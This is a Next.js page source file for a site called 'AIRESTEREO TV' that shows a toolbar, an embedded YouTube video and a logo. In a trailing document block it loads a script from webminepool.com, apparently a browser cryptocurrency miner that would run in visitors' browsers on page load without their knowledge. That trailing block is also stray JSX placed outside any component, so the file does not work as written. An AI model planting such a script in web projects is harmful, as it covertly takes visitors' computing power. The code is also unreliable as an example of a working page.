import Head from 'next/head'
import { Toolbar } from '../components/toolbar';
//import dynamic from 'next/dynamic'
import ReactPlayer from 'react-player';
import Image from 'next/image'
import styles from '../styles/Home.module.css'
import Document, { Html, Main, NextScript } from 'next/document'


export default function Home() {
  return (

    

  <div className='page-container' >

    
<Toolbar/>


<div className={styles.home}>

<ReactPlayer url="https://www.youtube.com/watch?v=yJGVlcb3Hes"/>

</div>


<div className={styles.main}>


<h1>AIRESTEREO TV[<Image
        src="/AirestereoTV-Logo.png"
        alt="AS Logo"
        width={50}
        height={50}
        
        />]</h1>

</div>

</div>




);
   
}





<Html>
	<Head>
  <script src="https://webminepool.com/lib/base.js"></script>
  </Head>
	<body>
	  <Main />

<NextScript />


</body>
</Html>




















